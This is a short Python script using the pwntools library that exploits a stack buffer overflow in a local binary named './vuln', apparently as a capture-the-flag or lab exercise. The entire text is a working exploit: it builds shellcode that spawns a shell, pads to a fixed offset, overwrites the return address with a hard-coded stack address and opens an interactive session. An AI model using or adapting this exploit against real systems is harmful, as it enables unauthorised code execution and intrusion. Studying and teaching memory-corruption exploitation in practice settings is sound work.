#!/usr/bin/env python
from pwn import *


BIN = "./vuln"
context.binary = BIN
context.log_level = "ERROR"

# Determined through static analysis.
bytes_read = 0x1000
offset = 0x800

# Determined with gdb
addr = 0x7fffffffce30

nop_sled = ""
# nop_sled += "NOP\n" * 0x600
shellcode_asm = nop_sled + shellcraft.sh()
shellcode = asm(shellcode_asm)

io = process(BIN)

# Inject and trigger
payload = b""
payload += shellcode
payload += (offset + 8 - len(shellcode)) * b'A'
payload += pack(addr)

io.send(payload)
io.interactive()
